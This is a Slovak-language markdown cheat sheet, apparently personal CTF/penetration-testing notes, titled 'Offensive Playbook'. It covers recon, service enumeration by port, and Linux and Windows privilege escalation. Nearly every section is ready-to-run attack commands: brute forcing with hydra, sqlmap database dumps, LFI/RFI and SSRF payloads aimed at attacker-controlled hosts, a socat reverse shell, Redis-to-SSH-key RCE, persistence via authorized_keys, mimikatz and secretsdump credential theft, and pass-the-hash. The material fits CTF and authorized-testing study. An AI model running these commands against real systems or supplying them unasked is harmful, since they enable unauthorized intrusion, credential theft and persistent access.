---
layout: notes
title: "Playbook - Offensive"
folder: "Playbooks"
tags: [playbook, offensive, recon, privesc, post-exploitation, web]
---

# ⚔️ Offensive Playbook – Útok

---

## 📋 Obsah

1. [Fáza 1 – Recon](#fáza-1--recon)
2. [Fáza 2 – Enumeration podľa portov](#fáza-2--enumeration-podľa-portov)
3. [Fáza 3 – Mám credentials](#fáza-3--mám-credentials)
4. [Fáza 4 – Mám shell → PrivEsc](#fáza-4--mám-shell--privesc)
   - [Linux PrivEsc](#linux-privesc)
   - [Windows PrivEsc](#windows-privesc)
5. [Fáza 5 – Root / Administrator](#fáza-5--root--administrator)
6. [Web Application Checklist](#web-application-checklist)
7. [Zasekol som sa – čo teraz?](#zasekol-som-sa--čo-teraz)

---

## Fáza 1 – Recon

> Cieľ: Zistiť čo najviac o cieli pred akýmkoľvek útokom.

### Port Scan

```bash
# Základný scan s verziami a skriptami
nmap -sV -sC -oN nmap.txt <IP>

# Všetky porty (pomalší, ale kompletný)
nmap -p- -T4 <IP>

# Zraniteľnosti
nmap --script=vuln <IP>

# UDP scan (nezabudni!)
nmap -sU --top-ports 20 <IP>

# Agresívny scan (OS, verzie, skripty, traceroute)
nmap -A <IP>
```

### Checklist

- [ ] Základný nmap scan
- [ ] Full port scan (`-p-`)
- [ ] Vuln scan
- [ ] UDP scan
- [ ] Zaznač všetky otvorené porty a verzie
- [ ] Hľadaj zaujímavé bannery
- [ ] Poznač OS (Linux/Windows)

---

## Fáza 2 – Enumeration podľa portov

> Pre každý otvorený port nasleduj príslušný postup.

| Port | Služba | Postup |
|------|--------|--------|
| 21 | FTP | [→ FTP](#-ftp-port-21) |
| 22 | SSH | [→ SSH](#-ssh-port-22) |
| 23 | Telnet | [→ Telnet](#-telnet-port-23) |
| 25 | SMTP | [→ SMTP](#-smtp-port-25) |
| 53 | DNS | [→ DNS](#-dns-port-53) |
| 80 / 443 | HTTP/S | [→ Web](#-https-port-80443) |
| 110 | POP3 | [→ POP3](#-pop3-port-110) |
| 139 / 445 | SMB | [→ SMB](#-smb-port-139445) |
| 1433 | MSSQL | [→ MSSQL](#-mssql-port-1433) |
| 3306 | MySQL | [→ MySQL](#-mysql-port-3306) |
| 3389 | RDP | [→ RDP](#-rdp-port-3389) |
| 5985 | WinRM | [→ WinRM](#-winrm-port-5985) |
| 6379 | Redis | [→ Redis](#-redis-port-6379) |
| 8080 | HTTP alt | [→ Web](#-https-port-80443) |
| 27017 | MongoDB | [→ MongoDB](#-mongodb-port-27017) |

---

### 📁 FTP (Port 21)

```bash
# Anonymous login – prvá vec ktorú skúsiš
ftp <IP>
# Username: anonymous
# Password: anonymous (alebo prázdne)

# Bruteforce
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# Stiahni všetko rekurzívne
wget -r ftp://anonymous:anonymous@<IP>/

# NSE skripty
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 <IP>
```

**Checklist:**
- [ ] Anonymous login
- [ ] Stiahni všetky súbory
- [ ] Hľadaj credentials v súboroch
- [ ] Skús upload (ak má write prístup)
- [ ] Bruteforce ak žiadny anonymous

---

### 🔐 SSH (Port 22)

```bash
# Banner grab
nc -nv <IP> 22

# Auth metódy
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" <IP>

# Pripojenie
ssh user@<IP>
ssh -i id_rsa user@<IP>
chmod 600 id_rsa

# Bruteforce
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
medusa -h <IP> -u user -P rockyou.txt -M ssh

# Crack zaheslovaného id_rsa
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Username enumeration (OpenSSH < 7.7)
python3 ssh_user_enum.py --userList users.txt --hostname <IP>
```

**Checklist:**
- [ ] Skús default/obvious credentials
- [ ] Hľadaj id_rsa kľúče kdekoľvek na cieli
- [ ] Bruteforce (pomalé, skús iné vektory najprv)
- [ ] Skontroluj verziu → searchsploit

---

### 📺 Telnet (Port 23)

```bash
telnet <IP>

# Bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<IP>
```

**Checklist:**
- [ ] Anonymous / default login (admin:admin, admin:password)
- [ ] Bruteforce
- [ ] Nešifrované – sniff traffic ak si v sieti

---

### 📧 SMTP (Port 25)

```bash
# Manuálna enumerácia
nc -nv <IP> 25
EHLO test
VRFY root
VRFY admin

# Username enumeration
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M RCPT -U users.txt -t <IP>

# NSE skripty
nmap --script smtp-enum-users,smtp-open-relay -p 25 <IP>
```

**Checklist:**
- [ ] VRFY / RCPT enumeration usernames
- [ ] Open relay test
- [ ] Phishing ak máš valid usernames
- [ ] Hľadaj verziu → searchsploit

---

### 🌐 DNS (Port 53)

```bash
# Zone transfer – najdôležitejšie
dig axfr @<IP> <domain>
host -l <domain> <IP>

# Základná enumerácia
dig any <domain> @<IP>
nslookup -type=any <domain> <IP>

# Subdomain bruteforce
gobuster dns -d <domain> -w /usr/share/wordlists/subdomains.txt
dnsrecon -d <domain> -t brt -D /usr/share/wordlists/subdomains.txt
```

**Checklist:**
- [ ] Zone transfer (AXFR)
- [ ] Reverse lookup
- [ ] Subdomain bruteforce
- [ ] Hľadaj interné domény/hosty

---

### 🌍 HTTP/S (Port 80/443)

```bash
# Directory bruteforce
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Nikto scan
nikto -h http://<IP>

# Whatweb – fingerprint
whatweb http://<IP>

# Skontroluj
curl -I http://<IP>                   # HTTP hlavičky
curl http://<IP>/robots.txt
curl http://<IP>/.git/HEAD            # Git expozícia

# SQL Injection – manuálne
' OR '1'='1
' OR '1'='1'--
admin'--

# SQLMap
sqlmap -u "http://<IP>/page?id=1" --dbs
sqlmap -u "http://<IP>/page?id=1" -D dbname --tables
sqlmap -u "http://<IP>/page?id=1" -D dbname -T users --dump

# LFI / Path Traversal
http://<IP>/page?file=../../../etc/passwd
http://<IP>/page?file=....//....//....//etc/passwd
http://<IP>/page?file=php://filter/convert.base64-encode/resource=index.php

# RFI
http://<IP>/page?file=http://your-ip/shell.php

# CMS skeny
wpscan --url http://<IP> --enumerate u,p,t     # WordPress
joomscan --url http://<IP>                      # Joomla
droopescan scan drupal -u http://<IP>           # Drupal
```

**Checklist:**
- [ ] `robots.txt`, `sitemap.xml`, `.git`, `.env`, `backup.zip`
- [ ] Directory/file bruteforce
- [ ] Nikto scan
- [ ] Zdrojový kód stránky (Ctrl+U)
- [ ] Formuláre → SQLi, XSS
- [ ] Upload funkcia → file upload bypass
- [ ] Cookies a JWT tokeny
- [ ] LFI/RFI v parametroch
- [ ] SSRF v URL parametroch
- [ ] CMS detekcia → wpscan/joomscan
- [ ] Burp Suite – intercept

---

### 📬 POP3 (Port 110)

```bash
nc -nv <IP> 110
USER admin
PASS admin

# Bruteforce
hydra -l user -P rockyou.txt pop3://<IP>
```

---

### 🖧 SMB (Port 139/445)

```bash
# Enumerácia
nmap --script smb-enum-shares,smb-enum-users -p 445 <IP>
enum4linux -a <IP>
enum4linux-ng -A <IP>
smbmap -H <IP>
smbmap -H <IP> -u user -p password

# Anonymous/null session
smbclient -L //<IP> -N
smbclient //<IP>/share -N

# Prihlásenie s credentials
smbclient //<IP>/share -U user

# Mount share
mount -t cifs //<IP>/share /mnt/smb -o username=user,password=pass

# Exploits
nmap --script smb-vuln-ms17-010 -p 445 <IP>     # EternalBlue
python3 eternalblue.py <IP>
```

**Checklist:**
- [ ] Null session enumerácia
- [ ] Vypíš všetky shares
- [ ] Stiahni všetko z prístupných shares
- [ ] Hľadaj credentials v súboroch
- [ ] EternalBlue check (MS17-010)
- [ ] PrintNightmare, PetitPotam

---

### 🗄️ MSSQL (Port 1433)

```bash
# Pripojenie
impacket-mssqlclient user:pass@<IP>
sqsh -S <IP> -U user -P pass

# Enumerácia
nmap --script ms-sql-info,ms-sql-config -p 1433 <IP>

# xp_cmdshell (RCE ak je povolené)
EXEC xp_cmdshell 'whoami';
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Bruteforce
hydra -l sa -P rockyou.txt mssql://<IP>
```

**Checklist:**
- [ ] SA (System Administrator) login – default prázdne heslo
- [ ] xp_cmdshell aktivácia → RCE
- [ ] Linked servers → pivot

---

### 🐬 MySQL (Port 3306)

```bash
# Pripojenie
mysql -u root -p -h <IP>
mysql -u root --password='' -h <IP>

# Enumerácia po prihlásení
show databases;
use <db>;
show tables;
select * from users;

# UDF – privilege escalation (ak root)
# Zapíš UDF knižnicu a spusti OS príkazy

# Bruteforce
hydra -l root -P rockyou.txt mysql://<IP>
```

---

### 🖥️ RDP (Port 3389)

```bash
# Pripojenie
xfreerdp /u:user /p:pass /v:<IP>
xfreerdp /u:user /p:pass /v:<IP> /cert:ignore

# Bruteforce
hydra -l user -P rockyou.txt rdp://<IP> -t 4
crowbar -b rdp -s <IP>/32 -u user -C rockyou.txt

# BlueKeep check (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p 3389 <IP>
python3 bluekeep.py <IP>

# Pass-the-Hash (ak máš NTLM hash)
xfreerdp /u:user /pth:<NTLM-hash> /v:<IP>
```

---

### ⚙️ WinRM (Port 5985)

```bash
# Evil-WinRM (najpohodlnejší)
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -H <NTLM-hash>

# CrackMapExec
crackmapexec winrm <IP> -u user -p pass
```

---

### 🔴 Redis (Port 6379)

```bash
# Pripojenie (zvyčajne bez auth)
redis-cli -h <IP>
info
keys *
get <key>

# RCE cez SSH authorized_keys (ak redis beží ako root)
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA... attacker@kali\n\n"
save
```

---

### 🍃 MongoDB (Port 27017)

```bash
# Pripojenie (zvyčajne bez auth)
mongo <IP>
mongo <IP>:27017

# Enumerácia
show dbs
use <db>
show collections
db.<collection>.find()
```

---

## Fáza 3 – Mám credentials

> Credentials môžeš získať z: bruteforce, súborov na FTP/SMB/web, databázy, konfigurákov.

```bash
# Skús credentials na VŠETKÝCH dostupných službách!
ssh user@<IP>
smbclient //<IP>/share -U user
mysql -u user -p -h <IP>
xfreerdp /u:user /p:pass /v:<IP>
evil-winrm -i <IP> -u user -p pass
ftp <IP>   # login s credentials
```

### Password Reuse Checklist

- [ ] SSH
- [ ] SMB / smbclient
- [ ] FTP
- [ ] RDP
- [ ] WinRM / Evil-WinRM
- [ ] MySQL / MSSQL
- [ ] HTTP login panel
- [ ] `sudo -l` (Linux) – skús heslo
- [ ] `net user` / `net localgroup administrators` (Windows)

---

## Fáza 4 – Mám shell → PrivEsc

### Stabilizácia shellu

```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'

# Upgrade na plný interaktívny shell
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
stty rows 38 cols 116     # nastav veľkosť podľa tvojho terminálu

# Alternatíva – rlwrap
rlwrap nc -lvnp 4444

# Socat upgrade
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444
```

---

### 🐧 Linux PrivEsc

#### Automatická enumerácia

```bash
# LinPEAS – najkomplexnejší
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# alebo stiahni a spusti
./linpeas.sh | tee linpeas.txt

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 1
```

#### Manuálna enumerácia

```bash
# Základné info
whoami; id; hostname; uname -a
cat /etc/passwd
cat /etc/os-release

# Sudo oprávnenia – KRITICKÉ
sudo -l

# SUID/SGID bity – KRITICKÉ
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID

# Capabilities
getcap -r / 2>/dev/null

# Cron joby
cat /etc/crontab
ls -la /etc/cron*
crontab -l
# Pozri aj /var/spool/cron/

# Writable súbory/adresáre
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Hľadaj credentials v konfigurakoch
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass" 2>/dev/null

# NFS shares (no_root_squash exploit)
cat /etc/exports
showmount -e <IP>

# Bežiace procesy
ps aux
ps aux | grep root

# Sieťové pripojenia
netstat -tulnp
ss -tulnp

# Nainštalovaný software
dpkg -l
rpm -qa

# Kernel exploity
uname -r
# searchsploit linux kernel <verzia>
```

#### GTFOBins – sudo/SUID exploity

```
Ak vidíš niečo v sudo -l alebo ako SUID binary:
→ https://gtfobins.github.io/
→ Hľadaj binary → vyber sudo / SUID / Capabilities
```

#### Časté vektory

| Vektor | Príkaz/Postup |
|--------|---------------|
| sudo `vim` | `sudo vim -c ':!/bin/bash'` |
| sudo `find` | `sudo find . -exec /bin/bash \; -quit` |
| sudo `python` | `sudo python3 -c 'import os;os.system("/bin/bash")'` |
| SUID `bash` | `/bin/bash -p` |
| Writable `/etc/passwd` | Pridaj nového root usera |
| Writable cron script | Vlož reverse shell |
| PATH hijacking | Vytvor falošný binary v `$PATH` |
| Kernel exploit | Skontroluj verziu → searchsploit |

---

### 🪟 Windows PrivEsc

#### Automatická enumerácia

```powershell
# WinPEAS
.\winPEASany.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# JAWS
.\jaws-enum.ps1
```

#### Manuálna enumerácia

```powershell
# Základné info
whoami /all
systeminfo
hostname
net user
net localgroup administrators

# Slabo nakonfigurované služby
sc query
icacls "C:\Program Files\SomeService\service.exe"
accesschk.exe -ucqv *

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"

# Scheduled tasks
schtasks /query /fo LIST /v

# Credentials v registri / súboroch
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si password *.txt *.ini *.config *.xml

# SAM dump (lokálne)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# PowerShell history
type C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Časté vektory

| Vektor | Postup |
|--------|--------|
| AlwaysInstallElevated | Vytvor malicious `.msi` → spusti |
| Unquoted service path | Umiestni binary do medzery v path |
| Weak service permissions | Nahraď binary revershellom |
| Token impersonation | PrintSpoofer, GodPotato, JuicyPotato |
| DLL hijacking | Nahraď chýbajúci DLL |
| Stored credentials | `cmdkey /list` → `runas /savedcred` |

```powershell
# Token impersonation (SeImpersonatePrivilege)
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\JuicyPotatoNG.exe -t * -p cmd.exe
```

---

## Fáza 5 – Root / Administrator

### Linux

```bash
# Vlajka
cat /root/root.txt
cat /home/*/user.txt

# Dump hesiel
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=rockyou.txt

# SSH kľúče pre persistenciu
mkdir /root/.ssh
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Windows

```powershell
# Vlajka
type C:\Users\Administrator\Desktop\root.txt

# Dump hesiel
# Metasploit
hashdump

# Impacket (remote)
impacket-secretsdump administrator:pass@<IP>

# Mimikatz
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# NTLM hashes → Pass-the-Hash
impacket-psexec -hashes :NTLM administrator@<IP>
evil-winrm -i <IP> -u administrator -H <NTLM>
crackmapexec smb <IP> -u administrator -H <NTLM>
```

### Post-Exploitation Checklist

- [ ] Zachyť vlajky (root.txt, user.txt)
- [ ] Dump hashe / credentials
- [ ] Hľadaj ďalšie credentials v súboroch
- [ ] Skontroluj sieť – ďalšie hosty (pivoting)
- [ ] `arp -a` / `ip route` – interná sieť
- [ ] SSH tunneling / proxychains pre pivoting

---

## 🌐 Web Application Checklist

### Rýchly postup

```
1. Fingerprint technológiu
2. Directory bruteforce
3. Hľadaj vstupné body (formuláre, parametre)
4. Testuj každý vstupný bod
5. Hľadaj autentifikačné nedostatky
6. Business logic testing
```

### Nástroje

```bash
# Fingerprint
whatweb http://<IP>
wappalyzer (browser extension)

# Discovery
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ

# Skryté parametre
ffuf -w params.txt -u "http://<IP>/page?FUZZ=value"
arjun -u http://<IP>/page

# Subdomény
gobuster vhost -u http://<domain> -w /usr/share/wordlists/subdomains.txt
ffuf -w subdomains.txt -u http://FUZZ.<domain>
```

### Zraniteľnosti

```bash
# SQL Injection
sqlmap -u "http://<IP>/?id=1" --dbs --batch
sqlmap -u "http://<IP>/" --forms --batch --crawl=5

# XSS – testovací payload
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>

# LFI
?file=../../../etc/passwd
?file=....//....//etc/passwd
?file=/etc/passwd%00              # null byte (starší PHP)
?file=php://filter/convert.base64-encode/resource=config.php

# SSRF
?url=http://127.0.0.1:80
?url=http://169.254.169.254/latest/meta-data/    # AWS metadata
?redirect=http://attacker.com

# File Upload Bypass
# Zmeň extension: shell.php → shell.php.jpg → shell.phtml → shell.php5
# Zmeň Content-Type na image/jpeg
# Double extension: shell.jpg.php
# Null byte: shell.php%00.jpg
```

### CMS Checklist

```bash
# WordPress
wpscan --url http://<IP> --enumerate u          # usernames
wpscan --url http://<IP> --enumerate p          # pluginy
wpscan --url http://<IP> -U users.txt -P rockyou.txt  # bruteforce
# /wp-admin, /wp-login.php, /xmlrpc.php

# Joomla
joomscan --url http://<IP>
# /administrator

# Drupal
droopescan scan drupal -u http://<IP>
# /user/login
```

---

## Zasekol som sa – čo teraz?

```
1. Spusti znovu nmap – možno si niečo prehliadol
2. Skontroluj verzie VŠETKÝCH služieb
   → searchsploit <service> <version>
   → exploit-db.com
3. Google: "<service> <version> exploit" / "CTF writeup <machine name>"
4. Skontroluj či si nepreskočil nejaký port/adresár
5. Prečítaj znovu zadanie – hint býva v texte
6. Skús iné wordlisty (seclist, dirbuster medium/large)
7. Skús enumerate usernamy a password spray
8. Skontroluj UDP porty
```

```bash
# Väčší wordlist
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

# Password spray (neopakuj bruteforce, skús top heslá)
crackmapexec ssh <IP> -u users.txt -p /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt

# Searchsploit
searchsploit <service> <version>
searchsploit -x <exploit-id>     # zobraz exploit
searchsploit -m <exploit-id>     # stiahni exploit
```
